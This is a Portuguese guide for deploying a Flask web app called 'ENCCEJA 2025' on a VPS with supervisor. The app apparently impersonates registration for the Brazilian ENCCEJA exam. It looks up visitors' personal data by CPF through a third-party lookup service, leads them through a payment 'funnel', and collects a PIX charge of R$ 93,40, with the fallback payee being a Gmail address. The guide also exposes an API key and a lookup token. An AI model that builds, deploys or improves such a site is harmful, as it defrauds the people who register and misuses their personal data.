# ENCCEJA 2025 - Guia Final de Deploy VPS

## 🎯 APLICAÇÃO FINAL LIMPA CRIADA

**Arquivo:** `VPS_FINAL_CLEAN_APP.py`

### ✅ Problemas Resolvidos:

1. **Fluxo Correto da Replit:**
   - `/inscricao` → consulta CPF → mostra resultado → botão "Continuar Inscrição"
   - `/encceja-info` → informações do exame
   - `/validar-dados` → confirmar dados pessoais
   - `/endereco` → informar endereço
   - `/local-prova` → escolher local
   - `/pagamento` → gerar PIX R$ 93,40
   - `/inscricao-sucesso` → finalização

2. **APIs Corrigidas:**
   - ✅ CPF API funcionando: `https://consulta.fontesderenda.blog/cpf.php`
   - ✅ WitePay com fallback para PIX direto
   - ❌ SMS removido (não usado)
   - ❌ For4Payments removido (não usado)

3. **Templates com Fallback:**
   - Se templates externos não existirem, usa HTML embutido
   - Interface completa e funcional
   - Design responsivo

4. **Dependências Mínimas:**
   - Apenas `flask` e `requests` obrigatórios
   - `qrcode` opcional (tem fallback)

## 🚀 DEPLOY NA VPS - PASSO A PASSO

### PASSO 1: Upload da Aplicação Final

**Via MobaXterm:**
1. Conecte na VPS
2. Navegue para `/var/www/encceja/`
3. Faça backup: `mv app.py app.py.old`
4. Arraste `VPS_FINAL_CLEAN_APP.py` para a pasta
5. Renomeie: `mv VPS_FINAL_CLEAN_APP.py app.py`

**Via Comandos SSH:**
```bash
# Conectar na VPS
ssh root@seu-servidor.com

# Ir para diretório
cd /var/www/encceja

# Backup da aplicação atual
mv app.py app.py.backup_$(date +%Y%m%d_%H%M%S)

# (Upload via MobaXterm aqui)
# Renomear arquivo
mv VPS_FINAL_CLEAN_APP.py app.py

# Verificar arquivo
ls -la app.py
head -10 app.py
```

### PASSO 2: Configurar Environment

```bash
# Criar arquivo .env atualizado
cat > /var/www/encceja/.env << 'EOF'
# ENCCEJA 2025 - VPS Final
SESSION_SECRET=encceja-vps-final-2025-clean
WITEPAY_API_KEY=sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d
EOF

# Definir permissões
chown -R www-data:www-data /var/www/encceja
chmod -R 755 /var/www/encceja
chmod 600 /var/www/encceja/.env
```

### PASSO 3: Verificar Dependências

```bash
# Ativar ambiente virtual
cd /var/www/encceja
source venv/bin/activate

# Instalar dependências essenciais
pip install flask requests

# QRCode é opcional (aplicação tem fallback)
pip install qrcode[pil] || echo "QRCode opcional - aplicação funcionará sem"

# Verificar instalações
pip list | grep -E "(flask|requests)"
python -c "import flask, requests; print('Dependências OK')"
```

### PASSO 4: Testar Aplicação Manualmente

```bash
# Testar se a aplicação carrega
cd /var/www/encceja
source venv/bin/activate

# Teste rápido
python -c "
import app
print('✅ Aplicação carregou sem erros!')

# Testar rota de status
with app.app.test_client() as client:
    response = client.get('/status')
    print(f'Status HTTP: {response.status_code}')
    if response.status_code == 200:
        print('✅ Rota /status funcionando')
        print(response.get_json())
    else:
        print('❌ Erro na rota /status')
"
```

### PASSO 5: Configurar Supervisor

```bash
# Parar aplicação atual
supervisorctl stop encceja

# Configurar supervisor
cat > /etc/supervisor/conf.d/encceja.conf << 'EOF'
[program:encceja]
command=/var/www/encceja/venv/bin/python /var/www/encceja/app.py
directory=/var/www/encceja
user=www-data
autostart=true
autorestart=true
startsecs=10
startretries=3
stderr_logfile=/var/log/encceja_error.log
stdout_logfile=/var/log/encceja_output.log
environment=PATH="/var/www/encceja/venv/bin",PYTHONPATH="/var/www/encceja"
redirect_stderr=false
stdout_logfile_maxbytes=50MB
stdout_logfile_backups=5
stderr_logfile_maxbytes=50MB
stderr_logfile_backups=5
EOF

# Recarregar configuração
supervisorctl reread
supervisorctl update
supervisorctl start encceja
```

### PASSO 6: Verificar Funcionamento

```bash
# 1. Status do supervisor
supervisorctl status encceja
# Deve mostrar: encceja RUNNING

# 2. Ver logs em tempo real
tail -f /var/log/encceja_output.log

# 3. Testar APIs localmente
curl http://localhost:5000/status
curl http://localhost:5000/health

# 4. Testar API CPF
curl "http://localhost:5000/test-cpf/12345678901"

# 5. Verificar processo na porta 5000
netstat -tlnp | grep :5000
```

### PASSO 7: Testar no Navegador

1. **Acesse seu domínio VPS**
2. **Página inicial deve aparecer** (redireciona para /inscricao)
3. **Teste o formulário CPF:**
   - Digite um CPF (ex: 12345678901)
   - Clique "Consultar CPF"
   - Deve mostrar dados encontrados
   - Clique "Continuar Inscrição"
4. **Navegue pelo funnel completo:**
   - ENCCEJA Info → Validar Dados → Endereço → Local Prova → Pagamento

## 🔧 SOLUÇÃO DE PROBLEMAS

### Se Supervisor mostrar "FATAL" ou "ERROR":

```bash
# Ver logs detalhados
tail -50 /var/log/encceja_error.log

# Testar aplicação manualmente
cd /var/www/encceja
source venv/bin/activate
python app.py
# Se der erro aqui, verificar a mensagem
```

### Se der erro de dependências:

```bash
# Reinstalar dependências
cd /var/www/encceja
source venv/bin/activate
pip install --upgrade flask requests
```

### Se a API CPF não funcionar:

```bash
# Testar API diretamente
curl "https://consulta.fontesderenda.blog/cpf.php?cpf=12345678901&token=1285fe4s-e931-4071-a848-3fac8273c55a"

# Se retornar dados, a API está OK
# Se não, verificar conectividade da VPS
```

### Se templates não carregarem:

Não há problema! A aplicação tem fallback HTML completo embutido.

### Se WitePay falhar:

Não há problema! A aplicação gera PIX direto com gerarpagamentos@gmail.com

## ✅ CHECKLIST FINAL

- [ ] Upload `VPS_FINAL_CLEAN_APP.py` ✓
- [ ] Renomeado para `app.py` ✓
- [ ] Arquivo `.env` configurado ✓
- [ ] Dependências instaladas ✓
- [ ] Supervisor configurado ✓
- [ ] Aplicação iniciada ✓
- [ ] Status `RUNNING` no supervisor ✓
- [ ] Curl local funciona ✓
- [ ] Site carrega no navegador ✓
- [ ] Formulário CPF funciona ✓
- [ ] Funnel completo operacional ✓
- [ ] PIX de R$ 93,40 é gerado ✓

## 🎉 RESULTADO FINAL

Após seguir este guia:

✅ **Sistema funcionando:** ENCCEJA 2025 completo na VPS
✅ **Fluxo idêntico à Replit:** Todas as páginas e transições
✅ **API CPF funcionando:** Consulta real de dados
✅ **PIX R$ 93,40:** WitePay + fallback funcionais
✅ **Interface completa:** Templates + fallback HTML
✅ **Zero dependências problemáticas:** Apenas essenciais
✅ **Logs detalhados:** Para debug e monitoramento

A aplicação estará rodando de forma estável, com o mesmo comportamento da versão Replit, mas otimizada para produção VPS.

## 📞 SUPORTE FINAL

Se ainda houver problemas após seguir todos os passos:

```bash
# Coletar informações para diagnóstico
echo "=== DIAGNÓSTICO COMPLETO ==="
echo "Supervisor Status:"
supervisorctl status encceja

echo "Logs Recentes:"
tail -20 /var/log/encceja_output.log
tail -20 /var/log/encceja_error.log

echo "Processo na Porta 5000:"
lsof -i :5000

echo "Teste Local:"
curl -I http://localhost:5000/status

echo "Teste API CPF:"
curl -s "http://localhost:5000/test-cpf/12345678901" | head -5

echo "Arquivos da Aplicação:"
ls -la /var/www/encceja/app.py
```

A aplicação final está preparada para funcionar de forma robusta e estável na VPS, mantendo todas as funcionalidades da versão original.